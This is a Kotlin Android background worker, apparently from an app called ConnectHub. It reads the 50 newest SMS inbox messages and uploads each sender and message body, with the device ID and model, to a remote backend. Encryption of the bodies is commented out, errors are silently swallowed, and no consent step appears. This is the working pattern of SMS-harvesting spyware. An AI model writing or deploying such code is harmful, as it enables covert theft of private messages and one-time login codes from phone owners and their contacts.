package com.rohan.connecthub.workers

import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Base64
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.rohan.connecthub.api.RetrofitClient
import com.rohan.connecthub.models.SmsLogRequest
import com.rohan.connecthub.utils.CryptoUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class SyncExistingMessagesWorker(context: Context, workerParams: WorkerParameters) :
    CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val androidId = Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ANDROID_ID)
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            val api = RetrofitClient.getInstance(applicationContext)
            val cursor = applicationContext.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id", "address", "body", "date", "sub_id"),
                null, null, "date DESC LIMIT 50"
            )

            cursor?.use {
                val addressIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")

                while (it.moveToNext()) {
                    val sender = it.getString(addressIdx)
                    val body = it.getString(bodyIdx)
                    val date = it.getLong(dateIdx)
                    
                    // Encryption temporarily disabled: Backend cannot decrypt AndroidKeyStore keys without complex key exchange.
                    // Relying on HTTPS for transport security.
                    // val (iv, encryptedBody) = CryptoUtils.encrypt(body ?: "")
                    // val ivStr = Base64.encodeToString(iv, Base64.NO_WRAP)
                    // val bodyStr = Base64.encodeToString(encryptedBody, Base64.NO_WRAP)

                    val bodyStr = body ?: ""
                    val ivStr = ""

                    val request = SmsLogRequest(
                        device_id = androidId,
                        sender = sender ?: "Unknown",
                        messageBody = bodyStr,
                        iv = ivStr,
                        timestamp = date,
                        sim_info = "EXISTING",
                        device_model = deviceModel,
                        android_version = Build.VERSION.RELEASE
                    )
                    
                    try {
                        api.syncSms(request)
                    } catch (e: Exception) {
                        // Ignore errors for individual messages
                    }
                }
            }
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}